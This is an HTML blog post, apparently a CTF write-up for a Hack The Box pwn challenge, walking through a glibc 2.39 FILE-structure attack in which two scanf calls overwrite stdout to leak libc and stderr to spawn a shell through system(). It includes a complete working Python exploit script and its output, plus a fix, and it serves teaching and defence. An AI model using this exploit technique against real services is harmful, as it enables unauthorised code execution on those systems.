@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>The Emptiness Machine | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="Two profoundly cursed scanf() calls led to a FILE-structure attack hiding inside the process&#x27;s standard streams.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/the-emptiness-machine.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/the-emptiness-machine.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="The Emptiness Machine">
+<meta property="og:description" content="Two profoundly cursed scanf() calls led to a FILE-structure attack hiding inside the process&#x27;s standard streams.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="The Emptiness Machine">
+<meta name="twitter:description" content="Two profoundly cursed scanf() calls led to a FILE-structure attack hiding inside the process&#x27;s standard streams.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="/ai-security/" title="AI Security">
+                    <span>AI Security</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">The Emptiness Machine</h1>
+    <div class="post-description">Two profoundly cursed <code>scanf()</code> calls led to a FILE-structure attack hiding inside the process&#x27;s standard streams.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>The story alluded to a race condition. Attacker-controlled input was discovered overwriting glibc's live <code>stdout</code> and <code>stderr</code> objects. The first corruption leaked a libc pointer through <code>stdout</code>. The second used <code>stderr</code> to reach <code>system()</code>.</p>
+
+<table>
+
+<tr><td><strong>Event</strong></td><td>Hack The Box Cyber Apocalypse 2026</td></tr>
+
+<tr><td><strong>Category</strong></td><td>Pwn</td></tr>
+
+<tr><td><strong>Difficulty</strong></td><td>Medium</td></tr>
+
+<tr><td><strong>Points</strong></td><td>975</td></tr>
+
+<tr><td><strong>Outcome</strong></td><td>Solved</td></tr>
+
+</table>
+
+<img src="/images/the-emptiness-machine/Screenshot 2026-07-25 at 12.15.53 AM.png" alt="The Emptiness Machine challenge overview showing its story, medium difficulty, and 975-point value" style="max-width:100%;margin:2rem 0;">
+
+<h2>The assignment</h2>
+
+<p>Two versions of Rin ran side by side. Whichever one moved first would decide the outcome.</p>
+
+<p>The ZIP contained a 64-bit x86-64 ELF binary and two Ubuntu glibc 2.39 files. PIE, NX, and full RELRO were enabled. There was no stack canary.</p>
+
+<p>The Docker ran a small text service. I switched to <code>netcat</code>.</p>
+
+<h2>Two profoundly cursed reads</h2>
+
+<p>The binary confirmed the story's two currents:</p>
+
+<pre><code class="language-c">scanf(&quot;%40s&quot;, stdout);
+scanf(&quot;%224s&quot;, stderr);</code></pre>
+
+<p>Both destination arguments pointed to glibc's live FILE structures.</p>
+
+<p>The first payload was 33 bytes. <code>%40s</code> accepted it and added a null terminator. The second payload was 224 bytes. <code>%224s</code> accepted it and added another null terminator.</p>
+
+<p>Looks a bit grim (muahaha...).</p>
+
+<p>It's beginning to feel a lot like file exploitation.</p>
+
+<p>Required glibc 2.39 offsets:</p>
+
+<pre><code class="language-python">LEAK_TO_LIBC_BASE = 0x1BD4A0
+STDERR            = 0x2044E0
+STDERR_LOCK       = 0x205700
+SYSTEM            = 0x58750
+WFILE_JUMPS       = 0x202228</code></pre>
+
+<p>ASLR moved libc on every connection. The second payload needed libc's base.</p>
+
+<h2>Stage one: Make <code>stdout</code> leak libc</h2>
+
+<p>The first payload replaced the beginning of <code>stdout</code>:</p>
+
+<pre><code class="language-python">def build_stage1() -&gt; bytes:
+    return p64(0xFBAD1800) + p64(0) * 3 + b&quot;\x00&quot;</code></pre>
+
+<p><code>0xfbad1800</code> changed <code>stdout</code>'s flags. The zeroed pointer fields made the next <code>printf()</code> write process memory to the connection.</p>
+
+<p>The leak included a pointer into the supplied libc. Its offset was <code>0x1bd4a0</code>:</p>
+
+<pre><code class="language-text">leaked libc pointer - 0x1bd4a0 = libc base</code></pre>
+
+<p>I subtracted the offset and calculated libc's base. I then calculated <code>stderr</code>, its lock, <code>system()</code>, and <code>_IO_wfile_jumps</code>.</p>
+
+<h2>The local parser failed remotely</h2>
+
+<p>My first script read the leaked pointer from bytes <code>0x48:0x50</code>:</p>
+
+<pre><code class="language-python">leaked_pointer = u64(disclosure[0x48:0x50])</code></pre>
+
+<p>It worked against the supplied files. The remote service returned a larger disclosure and shifted the pointer to offset <code>0x1048</code>.</p>
+
+<img src="/images/the-emptiness-machine/Screenshot 2026-07-25 at 12.53.20 AM copy.png" alt="Initial exploit exhausting twenty attempts because it read the remote disclosure at a fixed offset" style="max-width:100%;margin:2rem 0;">
+
+<p>The exploit was fine. The parser needed some adjustments.</p>
+
+<p>I changed <code>find_libc_base()</code> to scan the entire disclosure:</p>
+
+<pre><code class="language-python">def find_libc_base(disclosure: bytes) -&gt; tuple[int, int, int]:
+    candidates = []
+
+    for offset in range(len(disclosure) - 7):
+        leaked_pointer = u64(disclosure[offset : offset + 8])
+        libc_base = leaked_pointer - LEAK_TO_LIBC_BASE
+
+        if not 0x700000000000 &lt;= leaked_pointer &lt; 0x800000000000:
+            continue
+
+        if libc_base &lt;= 0 or libc_base &amp; 0xFFF:
+            continue
+
+        candidates.append((offset, leaked_pointer, libc_base))
+
+    if not candidates:
+        raise ValueError(&quot;no page-aligned libc candidate&quot;)
+
+    return candidates[0]</code></pre>
+
+<p><code>find_libc_base()</code> accepted pointers in the 64-bit shared-library range. The calculated libc base also had to be page-aligned.</p>
+
+<p>The remote pointer appeared at <code>0x1048</code>.</p>
+
+<h2>Stage two: Turn <code>stderr</code> into a shell</h2>
+
+<p>The 224-byte second payload held a House-of-Apple-style wide FILE layout.</p>
+
+<p>I pointed the outer vtable at glibc's <code>_IO_wfile_jumps</code> table. It passed the vtable check. I set <code>_wide_data</code> to <code>stderr - 0x10</code>. Glibc read the required fields from the overwritten region. The fake wide vtable sat at <code>stderr + 0x60</code>.</p>
+
+<p>Payload fields:</p>
+
+<pre><code class="language-python">payload[0:8] = b&quot;A=;sh\x00\x00\x00&quot;
+
+put64(payload, 0x20, 0)                       # _IO_write_base
+put64(payload, 0x28, 1)                       # _IO_write_ptr
+put64(payload, 0x88, libc_base + STDERR_LOCK)
+put64(payload, 0xA0, stderr - 0x10)           # _wide_data
+struct.pack_into(&quot;&lt;i&quot;, payload, 0xC0, 0)      # _mode
+put64(payload, 0xC8, libc_base + SYSTEM)
+put64(payload, 0xD0, stderr + 0x60)           # fake wide vtable
+put64(payload, 0xD8, libc_base + WFILE_JUMPS)</code></pre>
+
+<p><code>main()</code> returned. Glibc flushed its open streams. The forged write pointers marked <code>stderr</code> as pending output. The wide-file overflow path reached offset <code>0xC8</code>. Offset <code>0xC8</code> held <code>system()</code>.</p>
+
+<p><code>system()</code> received <code>stderr</code>'s address as its command string. The object began with:</p>
+
+<pre><code class="language-text">A=;sh</code></pre>
+
+<p><code>A=</code> created an empty shell variable. The semicolon ended that command. <code>sh</code> opened the shell.</p>
+
+<h2>When ASLR adds whitespace</h2>
+
+<p>Both reads used <code>%s</code>. A space, tab, newline, or another whitespace byte would stop the second read early.</p>
+
+<p>Every connection generated a new libc address. Some packed addresses contained a whitespace byte. I checked stage two before sending it:</p>
+
+<pre><code class="language-python">bad = [
+    (index, byte)
+    for index, byte in enumerate(stage2)
+    if byte in b&quot; \t\n\r\v\f&quot;
+]</code></pre>
+
+<p>If the check found one, I closed the connection and tried a new libc address.</p>
+
+<h2>Full exploit</h2>
+
+<p>The exploit will appear here and on the <a href="/scripts/">Scripts page</a> as <code>the_emptiness_machine_exploit.py</code>.</p>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Exploit for HTB Cyber Apocalypse 2026: The Emptiness Machine.&quot;&quot;&quot;
+
+from __future__ import annotations
+
+import argparse
+import re
+import socket
+import struct
+import sys
+import time
+
+
+PROMPT = b&quot;Rin&#x27;s interaction: &quot;
+WHITESPACE = b&quot; \t\n\r\v\f&quot;
+
+# Offsets in the supplied Ubuntu glibc 2.39.
+LEAK_TO_LIBC_BASE = 0x1BD4A0
+STDERR = 0x2044E0
+STDERR_LOCK = 0x205700
+SYSTEM = 0x58750
+WFILE_JUMPS = 0x202228
+
+
+def p64(value: int) -&gt; bytes:
+    return struct.pack(&quot;&lt;Q&quot;, value)
+
+
+def u64(data: bytes) -&gt; int:
+    return struct.unpack(&quot;&lt;Q&quot;, data)[0]
+
+
+def put64(payload: bytearray, offset: int, value: int) -&gt; None:
+    payload[offset : offset + 8] = p64(value)
+
+
+class Connection:
+    def __init__(self, host: str, port: int, timeout: float) -&gt; None:
+        self.sock = socket.create_connection((host, port), timeout=timeout)
+        self.sock.settimeout(timeout)
+        self.buffer = bytearray()
+
+    def close(self) -&gt; None:
+        self.sock.close()
+
+    def sendline(self, data: bytes) -&gt; None:
+        self.sock.sendall(data + b&quot;\n&quot;)
+
+    def recvuntil(self, marker: bytes, maximum: int = 2 * 1024 * 1024) -&gt; bytes:
+        while marker not in self.buffer:
+            chunk = self.sock.recv(65536)
+            if not chunk:
+                raise EOFError(f&quot;connection closed after {len(self.buffer)} bytes&quot;)
+            self.buffer.extend(chunk)
+            if len(self.buffer) &gt; maximum:
+                raise RuntimeError(f&quot;marker not found within {maximum} bytes&quot;)
+
+        end = self.buffer.index(marker) + len(marker)
+        result = bytes(self.buffer[:end])
+        del self.buffer[:end]
+        return result
+
+    def recvall(self, idle_timeout: float = 2.0) -&gt; bytes:
+        output = bytearray(self.buffer)
+        self.buffer.clear()
+        deadline = time.monotonic() + idle_timeout
+        while time.monotonic() &lt; deadline:
+            try:
+                chunk = self.sock.recv(65536)
+            except socket.timeout:
+                break
+            if not chunk:
+                break
+            output.extend(chunk)
+            deadline = time.monotonic() + idle_timeout
+        return bytes(output)
+
+
+def build_stage1() -&gt; bytes:
+    return p64(0xFBAD1800) + p64(0) * 3 + b&quot;\x00&quot;
+
+
+def build_stage2(libc_base: int) -&gt; bytes:
+    stderr = libc_base + STDERR
+    payload = bytearray(224)
+
+    # stderr begins with the command passed to system().
+    payload[0:8] = b&quot;A=;sh\x00\x00\x00&quot;
+
+    # Mark stderr for flushing during exit.
+    put64(payload, 0x20, 0)  # _IO_write_base
+    put64(payload, 0x28, 1)  # _IO_write_ptr
+    put64(payload, 0x88, libc_base + STDERR_LOCK)
+
+    # Store the wide FILE layout inside stderr.
+    put64(payload, 0xA0, stderr - 0x10)  # _wide_data
+    struct.pack_into(&quot;&lt;i&quot;, payload, 0xC0, 0)  # _mode
+    put64(payload, 0xC8, libc_base + SYSTEM)
+    put64(payload, 0xD0, stderr + 0x60)  # fake wide vtable
+    put64(payload, 0xD8, libc_base + WFILE_JUMPS)  # validated outer vtable
+
+    return bytes(payload)
+
+
+def find_libc_base(disclosure: bytes) -&gt; tuple[int, int, int]:
+    &quot;&quot;&quot;Scan the disclosure for the libc pointer.&quot;&quot;&quot;
+
+    candidates = []
+    for offset in range(len(disclosure) - 7):
+        leaked_pointer = u64(disclosure[offset : offset + 8])
+        libc_base = leaked_pointer - LEAK_TO_LIBC_BASE
+
+        if not 0x700000000000 &lt;= leaked_pointer &lt; 0x800000000000:
+            continue
+        if libc_base &lt;= 0 or libc_base &amp; 0xFFF:
+            continue
+
+        candidates.append((offset, leaked_pointer, libc_base))
+
+    if not candidates:
+        raise ValueError(
+            f&quot;no page-aligned libc candidate in {len(disclosure)} leaked bytes&quot;
+        )
+
+    return candidates[0]
+
+
+def exploit_once(
+    host: str,
+    port: int,
+    timeout: float,
+    command: str,
+) -&gt; tuple[bytes | None, str]:
+    connection = Connection(host, port, timeout)
+    try:
+        connection.recvuntil(PROMPT)
+        connection.sendline(build_stage1())
+
+        disclosure = connection.recvuntil(PROMPT)
+        try:
+            leak_offset, leaked_pointer, libc_base = find_libc_base(disclosure)
+        except ValueError as exc:
+            return None, str(exc)
+
+        stage2 = build_stage2(libc_base)
+        bad = [(index, byte) for index, byte in enumerate(stage2) if byte in WHITESPACE]
+        if bad:
+            locations = &quot;, &quot;.join(f&quot;{index:#x}={byte:#x}&quot; for index, byte in bad)
+            return None, f&quot;ASLR produced scanf whitespace bytes: {locations}&quot;
+
+        print(f&quot;[+] libc leak: {leaked_pointer:#x}&quot;)
+        print(f&quot;[+] libc base: {libc_base:#x}&quot;)
+        print(f&quot;[+] leak offset: {leak_offset:#x}&quot;)
+        connection.sendline(stage2)
+        connection.sendline(command.encode())
+        return connection.recvall(), &quot;payload delivered&quot;
+    finally:
+        connection.close()
+
+
+def main() -&gt; int:
+    parser = argparse.ArgumentParser()
+    parser.add_argument(&quot;host&quot;)
+    parser.add_argument(&quot;port&quot;, type=int)
+    parser.add_argument(
+        &quot;--command&quot;,
+        default=&quot;cat /flag.txt 2&gt;/dev/null; cat flag.txt 2&gt;/dev/null; exit&quot;,
+        help=&quot;command run by the spawned shell&quot;,
+    )
+    parser.add_argument(&quot;--attempts&quot;, type=int, default=20)
+    parser.add_argument(&quot;--timeout&quot;, type=float, default=4.0)
+    args = parser.parse_args()
+
+    for attempt in range(1, args.attempts + 1):
+        print(f&quot;[*] attempt {attempt}/{args.attempts}&quot;)
+        try:
+            output, status = exploit_once(
+                args.host,
+                args.port,
+                args.timeout,
+                args.command,
+            )
+        except (ConnectionError, EOFError, OSError, RuntimeError) as exc:
+            print(f&quot;[-] {exc}&quot;)
+            continue
+
+        if output is None:
+            print(f&quot;[-] retrying: {status}&quot;)
+            continue
+
+        sys.stdout.buffer.write(output)
+        if output and not output.endswith(b&quot;\n&quot;):
+            print()
+
+        match = re.search(rb&quot;HTB\{[^}\r\n]+\}&quot;, output)
+        if match:
+            print(f&quot;[+] flag: {match.group().decode()}&quot;)
+            return 0
+
+        print(&quot;[-] shell ran, but no HTB flag was found in its output&quot;)
+        return 1
+
+    print(&quot;[-] all attempts exhausted&quot;)
+    return 1
+
+
+if __name__ == &quot;__main__&quot;:
+    raise SystemExit(main())</code></pre>
+
+<h2>Proof of completion</h2>
+
+<p>I tested the supplied binary, loader, and glibc locally first:</p>
+
+<pre><code class="language-text">PWNED
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+<p>The corrected parser found the remote libc pointer at <code>0x1048</code>. Stage two opened a shell and printed the flag.</p>
+
+<pre><code class="language-bash">./the_emptiness_machine_exploit.py HOST PORT</code></pre>
+
+<pre><code class="language-text">[*] attempt 1/20
+[+] libc leak: 0x[redacted]
+[+] libc base: 0x[redacted]
+[+] leak offset: 0x1048
+[+] flag: HTB{REDACTED}</code></pre>
+
+<img src="/images/the-emptiness-machine/Screenshot 2026-07-25 at 1.04.08 AM copy.png" alt="Corrected exploit locating the libc pointer at offset 0x1048 and returning a redacted challenge proof" style="max-width:100%;margin:2rem 0;">
+
+<h2>The fix</h2>
+
+<p><code>stdout</code> and <code>stderr</code> need to be replaced with character buffers:</p>
+
+<pre><code class="language-c">char first[41];
+char second[225];
+
+scanf(&quot;%40s&quot;, first);
+scanf(&quot;%224s&quot;, second);</code></pre>
+
+<p><code>-Wall -Wextra -Werror -Wformat=2</code> catches incompatible pointer types during the build. PIE, NX, and full RELRO were already enabled.</p>
+
+<h2>Attribution</h2>
+
+<p>I completed the investigation and validated the exploit against the supplied files and remote challenge. AI assisted with parts of the exploit script and later revisions. No teammate contribution is documented for this challenge.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
